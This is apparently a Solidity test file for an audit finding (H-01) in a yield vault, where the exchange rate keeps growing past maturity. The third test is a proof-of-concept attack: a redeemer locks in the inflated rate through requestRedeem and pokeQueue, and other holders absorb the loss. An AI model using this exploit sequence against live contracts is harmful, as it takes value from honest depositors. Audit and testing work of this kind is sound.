// SPDX-License-Identifier: MIT
pragma solidity ^0.8.22;

import {BaseTest} from "../helpers/BaseTest.sol";

/// @notice Audit finding H-01: `totalAssets()` continues accruing virtual yield
///         past `maturityTime` until a keeper pokes the position, because
///         `block.timestamp * yieldRateSum` is not capped at maturity.
///         `pokeDecentral`'s `pendingYield` calc uses the same uncapped formula,
///         which locks the inflated value into `totalPendingYield` until
///         `executeYieldWithdrawal` reveals the actual (lower) Decentral
///         payout and the shortfall is socialised through `exchangeRate()`.
///
///         These tests demonstrate (a) the drift itself, and (b) how an
///         attacker who notices a delayed keeper can `requestRedeem` +
///         `pokeQueue` to rate-lock the inflated value, then let other share
///         holders absorb the eventual shortfall.
contract PostMaturityYieldDriftTest is BaseTest {
    /// @notice `exchangeRate()` keeps growing past `maturityTime` even though
    ///         Decentral has stopped accruing on the underlying position.
    function test_H01_exchangeRate_inflates_past_maturity() public {
        _deposit(alice, TEN_THOUSAND_HOLLAR);

        // Warp exactly to maturity. Get the "fair" rate at maturity.
        _warpDays(60);
        uint256 rateAtMaturity = vault.exchangeRate();

        // Keeper is late. Position is still Active even though Decentral has
        // stopped accruing on the real chain. Warp 14 more days with NO poke.
        _warpDays(14);
        uint256 rateAtPlus14 = vault.exchangeRate();

        // The vault thinks it has 14 more days of yield. On real Decentral
        // the position's accrual stopped at maturity, so this is virtual.
        assertGt(
            rateAtPlus14,
            rateAtMaturity,
            "rate continued to grow past maturity (bug -- should be capped)"
        );

        // Magnitude check: 14 days x 18% APY ~= 0.69% rate growth on a
        // principal-only position. With the dead-shares offset this lands
        // slightly under but still well above tolerance.
        uint256 drift = rateAtPlus14 - rateAtMaturity;
        assertGt(drift, 6e15, "drift > 0.6% of WAD"); // 6e15 / 1e18 = 0.6%
    }

    /// @notice The `pendingYield` recorded at the Active->YieldRequested
    ///         transition reflects the inflated post-maturity value. When
    ///         Decentral pays only up to maturity, the vault sees a yield
    ///         shortfall = (days_late / 365) x APY x principal.
    function test_H01_pendingYield_records_inflated_value() public {
        _deposit(alice, TEN_THOUSAND_HOLLAR);

        // 14 days past maturity, no poke.
        _warpDays(60 + 14);

        // Simulate the real-Decentral behaviour: pool pays only up to
        // maturityTime. Cap the mock's yield payout to the 60-day amount via
        // setYieldDelta -- the delta is the 14 days the vault over-projected.
        uint256 principal = TEN_THOUSAND_HOLLAR;
        uint256 yieldFor60d = (principal * APY_18_PERCENT * 60 days) /
            (365 days * 1e18);
        uint256 yieldFor74d = (principal * APY_18_PERCENT * 74 days) /
            (365 days * 1e18);
        int256 yieldOverpay = int256(yieldFor60d) - int256(yieldFor74d);
        pool.setYieldDelta(_tokenIdOf(0), yieldOverpay);

        // Active -> YieldWithdrawalRequested. pendingYield is set to the
        // INFLATED 74-day projection.
        vault.pokeDecentral(0);
        (, , , , , uint8 stateAfter) = vault.getPosition(0);
        assertEq(stateAfter, 1, "state is YieldWithdrawalRequested"); // enum index 1

        // Snapshot the vault's view at this moment -- it believes it will
        // receive 74 days of yield.
        uint256 taBeforeExecute = vault.totalAssets();
        uint256 totalPendingBefore = vault.totalPendingYield();
        assertApproxEqRel(
            totalPendingBefore,
            yieldFor74d,
            0.01e18,
            "totalPendingYield equals the inflated 74d projection"
        );

        // Decentral approves and the vault executes the withdrawal -- but the
        // delta clips it back to 60d. Shortfall flows into the exchange rate.
        pool.approveYieldWithdrawal(_tokenIdOf(0));
        vault.pokeDecentral(0);

        uint256 taAfterExecute = vault.totalAssets();
        assertLt(
            taAfterExecute,
            taBeforeExecute,
            "totalAssets dropped when Decentral revealed the actual payout"
        );

        // The shortfall is ~the 14-day overpay (slight slippage from rounding
        // and the dead-shares decimals offset).
        uint256 shortfall = taBeforeExecute - taAfterExecute;
        assertApproxEqRel(
            shortfall,
            uint256(-yieldOverpay),
            0.01e18,
            "shortfall ~= 14d x APY x principal"
        );
    }

    /// @notice Attack: when a matured-but-not-poked position is inflating the
    ///         rate AND there's idle HOLLAR available, an attacker can
    ///         requestRedeem + pokeQueue to lock in the inflated rate before
    ///         the eventual yield-execute drops the rate.
    ///
    ///         Setup uses two positions:
    ///         - Position 0 (Alice): fully redeemed early, leaving idle HOLLAR
    ///         - Position 1 (Bob, the attacker): matured but unpoked
    ///         - Position 2 (Charlie): a long-term holder absorbing the loss
    function test_H01_attacker_rate_locks_inflated_value() public {
        // Alice and Bob deposit; both positions will eventually mature.
        _deposit(alice, TEN_THOUSAND_HOLLAR);
        _deposit(bob, TEN_THOUSAND_HOLLAR);
        // Charlie is the long-term holder -- absorbs the eventual shortfall.
        _deposit(charlie, TEN_THOUSAND_HOLLAR);

        // 60 days: all three mature.
        _warpDays(60);

        // Alice's position is processed promptly. Her ~10300 HOLLAR (principal
        // + yield) sits in idleHollar.
        _processPositionFull(0);
        uint256 idle = vault.idleHollar();
        assertGt(idle, TEN_THOUSAND_HOLLAR, "idleHollar from Alice's full redeem");

        // Keeper sleeps. Bob's position (index 1) keeps inflating the rate.
        _warpDays(14);

        uint256 inflatedRate = vault.exchangeRate();

        // Apply the same yield-cap as before to position 1, so when it's
        // eventually executed Decentral only pays 60d worth.
        {
            uint256 principal = TEN_THOUSAND_HOLLAR;
            uint256 y60 = (principal * APY_18_PERCENT * 60 days) /
                (365 days * 1e18);
            uint256 y74 = (principal * APY_18_PERCENT * 74 days) /
                (365 days * 1e18);
            pool.setYieldDelta(_tokenIdOf(1), int256(y60) - int256(y74));
        }

        // Attack step 1: Bob requests redemption of all his shares.
        uint256 bobShares = vault.balanceOf(bob);
        uint256 reqId = _requestRedeem(bob, bobShares);

        // Attack step 2: pokeQueue settles his request against idleHollar at
        // the INFLATED rate, locking it in.
        vault.pokeQueue();

        // The settled portion is rate-locked: bilSettled x inflatedRate / WAD
        // worth of HOLLAR is now reserved for Bob.
        (, uint256 bilAmount, uint256 bilSettled, uint256 hollarOwed, ) = vault
            .getRedemptionRequest(reqId);
        assertEq(bilAmount, bobShares, "request bilAmount = full shares");
        assertGt(bilSettled, 0, "at least partial settle from idleHollar");

        // Snapshot Bob's lock-in price.
        uint256 hollarOwedPerBil = (hollarOwed * 1e18) / bilSettled;
        assertApproxEqRel(
            hollarOwedPerBil,
            inflatedRate,
            0.01e18,
            "Bob locked in at the inflated rate"
        );

        // Now position 1's lifecycle plays out. The vault first transitions
        // Active -> YieldWithdrawalRequested (locking the INFLATED pendingYield),
        // then the admin approves, then executeYieldWithdrawal pays the actual
        // (capped-at-60d) amount. The shortfall socialises through the rate.
        vault.pokeDecentral(1); // Active -> YieldWithdrawalRequested
        pool.approveYieldWithdrawal(_tokenIdOf(1));
        vault.pokeDecentral(1); // YieldWithdrawalRequested -> YieldClaimed (with shortfall)

        uint256 postShockRate = vault.exchangeRate();

        // The honest (post-shock) rate is below Bob's lock-in price.
        assertLt(
            postShockRate,
            hollarOwedPerBil,
            "Bob's lock-in rate > post-shock fair rate (he over-extracted)"
        );

        // Quantify Bob's stolen value: per-BIL extraction = hollarOwedPerBil
        // − postShockRate. Multiplied by bilSettled gives total over-extraction.
        uint256 perBilOverExtract = hollarOwedPerBil - postShockRate;
        uint256 totalOver = (perBilOverExtract * bilSettled) / 1e18;
        emit log_named_uint("Bob stole HOLLAR (wei)", totalOver);
        assertGt(totalOver, 0, "extraction > 0");
    }

    function _tokenIdOf(uint256 positionIndex) internal view returns (uint256) {
        (uint256 tokenId, , , , , ) = vault.getPosition(positionIndex);
        return tokenId;
    }
}
